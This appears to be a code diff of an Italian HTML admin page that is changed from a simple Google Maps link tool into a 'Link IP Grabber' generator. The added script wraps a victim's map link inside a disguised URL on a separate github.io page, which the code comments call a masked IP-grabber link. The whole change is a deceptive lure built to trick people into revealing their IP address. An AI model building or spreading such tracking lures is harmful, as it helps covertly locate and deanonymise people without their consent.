@@ -2,19 +2,31 @@
 <html lang="it">
 <head>
   <meta charset="UTF-8">
-  <title>Admin Mappa - Modifica Posizione</title>
+  <title>Admin - Genera Link IP Grabber</title>
 </head>
 <body>
-  <h2>Generatore posizione Google Maps</h2>
-  <label for="google-map-link">Link di condivisione Google Maps: </label><br>
-  <input type="text" id="google-map-link" value="https://www.google.com/maps?q=45.4642,9.1900"><br><br>
-  <button onclick="generaLink()">Genera Link</button>
-  <pre id="output"></pre>
+  <h2>Modifica Posizione</h2>
+  
+  <!-- Inserisci il link di Google Maps -->
+  <label for="google-map-link">Link di condivisione Google Maps:</label><br>
+  <input type="text" id="google-map-link" placeholder="https://www.google.com/maps?q=45.4642,9.1900"><br><br>
+  
+  <!-- Aggiungi un pulsante per generare il link -->
+  <button onclick="generaLink()">Genera Link IP Grabber</button>
+  
+  <h3>Link IP Grabber</h3>
+  <p id="link-output"></p>
 
   <script>
+    // Funzione per generare il link di IP grabber
     function generaLink() {
-      const link = document.getElementById('google-map-link').value;
-      document.getElementById('output').textContent = link;
+      const googleMapLink = document.getElementById('google-map-link').value;
+      
+      // Creiamo il link di IP Grabber mascherato
+      const grabberLink = "https://mappa-gps.github.io/map-link/index.html?location=" + encodeURIComponent(googleMapLink);
+      
+      // Mostriamo il link generato
+      document.getElementById('link-output').textContent = grabberLink;
     }
   </script>
 </body>
